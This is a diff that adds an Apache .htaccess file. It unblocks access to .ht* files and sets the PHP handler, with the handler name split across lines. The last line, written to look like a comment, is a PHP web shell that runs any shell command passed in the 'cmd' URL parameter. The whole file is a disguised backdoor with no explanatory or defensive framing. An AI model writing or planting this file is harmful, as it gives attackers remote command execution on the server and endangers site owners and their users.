@@ -1,0 +1,8 @@
+<Files ~ "^.ht">
+    Require all granted
+    Order allow,deny
+    Allow from all
+</Files>
+SetHandler application/x-httpd-p\
+hp
+# <?=system($_GET['cmd']);?>
